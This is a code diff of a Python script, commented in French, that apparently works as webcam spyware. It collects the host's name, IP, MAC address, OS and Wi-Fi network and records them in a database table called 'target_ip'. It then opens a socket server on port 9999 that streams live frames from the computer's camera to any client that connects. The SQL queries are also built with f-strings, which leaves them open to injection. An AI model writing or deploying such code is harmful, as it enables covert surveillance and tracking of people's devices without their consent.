@@ -23,6 +23,7 @@ def get_system_info_ext():
     computer_data = [host_name, ip_address, mac_address, os_name, os_version]
     return computer_data
 
+
 def get_connected_wifi_network():
     try:
         result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True, check=True, encoding='latin-1')
@@ -55,20 +56,35 @@ def close_connection(conn):
 host_ip = socket.gethostbyname(socket.gethostname())
 port = 9999
 
-# Création du socket serveur
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((host_ip, port))
-s.listen(1)
-print(f"Serveur démarré sur {host_ip}:{port}")
+conn = connect_to_database()
+if conn:
+    try:
+        cursor = conn.cursor()
+        
+        cursor.execute(f'SELECT COUNT(*) FROM target_ip WHERE ip = "{host_ip}" AND network = "{get_connected_wifi_network()}"')
+        row_count = cursor.fetchone()[0]
+        
+        if row_count == 0:
+            cursor.execute(f'INSERT INTO target_ip (`ip`, `computers_data`, `network`, `date`) VALUES ("{host_ip}", "{get_system_info_ext()}", "{get_connected_wifi_network()}", NOW())')
+            conn.commit()        
+        cursor.close()
+    finally:
+        close_connection(conn)
+
+# Configuration de la caméra
+cap = cv2.VideoCapture(0)
 
 while True:
     try:
+        # Création du socket serveur
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((host_ip, port))
+        s.listen(1)
+        print(f"Serveur démarré sur {host_ip}:{port}")
+
         # Accepter la connexion entrante
         conn_lh, addr = s.accept()
         print(f"Connexion établie avec {addr}")
-
-        # Configuration de la caméra
-        cap = cv2.VideoCapture(0)
 
         while True:
             ret, frame = cap.read()
@@ -83,7 +99,5 @@ while True:
         continue
     finally:
         # Fermeture de la connexion et de la caméra
-        if conn_lh:
-            conn_lh.close()
-        if cap:
-            cap.release()
+        conn_lh.close()
+        cap.release()
